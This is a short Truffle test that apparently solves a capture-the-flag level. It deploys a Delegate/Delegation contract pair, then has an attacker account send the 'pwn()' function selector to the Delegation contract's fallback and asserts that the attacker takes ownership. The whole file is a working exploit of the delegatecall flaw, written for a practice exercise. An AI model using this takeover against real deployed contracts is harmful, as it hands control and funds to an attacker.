const Delegate = artifacts.require("Delegate");
const Delegation = artifacts.require("Delegation");

contract("Delegation", (accounts) => {
    let delegate;
    let originalOwner = accounts[0];
    let attacker = accounts[1];

    before(async () => {
        delegate = await Delegate.new(originalOwner, {from: originalOwner});
        delegation = await Delegation.new(delegate.address, {from: originalOwner});

        let owner = await delegation.owner.call();
        expect(owner).to.equal(originalOwner, "victim not initialized correctly");
        expect(originalOwner).to.not.equal(attacker, "victim not initialized correctly");
    });

    it("attacker should be able to take ownership", async () => {
        let pwnSigBytes4 = web3.sha3("pwn()").substring(0, 10);
        await delegation.sendTransaction({from: attacker, data: pwnSigBytes4});

        let owner = await delegation.owner.call();
        expect(owner).to.equal(attacker, "attacker could not take ownership of victim contract");
    });
});